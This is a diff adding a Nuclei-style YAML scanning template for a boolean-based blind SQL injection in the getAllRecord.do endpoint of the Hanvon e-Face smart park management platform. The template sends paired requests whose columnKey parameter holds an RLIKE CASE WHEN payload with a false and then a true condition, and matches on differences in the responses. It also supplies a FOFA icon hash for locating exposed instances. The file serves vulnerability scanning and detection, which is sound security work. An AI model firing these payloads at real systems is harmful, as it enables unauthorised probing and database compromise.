@@ -1,0 +1,60 @@
+id: poc-yaml-hw-e-face-pass-spmp-getallrecord-do-sqli
+info:
+  name: 汉王e脸通智慧园区管理平台 getAllRecord.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: e脸通智慧园区管理平台
+    fofa: icon_hash="1380907357"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /manage/patrolRecord/getAllRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=pr.SIGN_TIME+RLIKE+(SELECT+(CASE+WHEN+(2962%3d2963)+THEN+0x70722e5349474e5f54494d45+ELSE+0x28+END))%23+wAOm&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":false'
+          - "网络异常"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - raw:
+      - |
+        GET /manage/patrolRecord/getAllRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=pr.SIGN_TIME+RLIKE+(SELECT+(CASE+WHEN+(2962%3d2962)+THEN+0x70722e5349474e5f54494d45+ELSE+0x28+END))%23+wAOm&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"total":'
+          - '"obj":'
+      - type: word
+        part: body
+        words:
+          - "网络异常"
+        negative: true
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
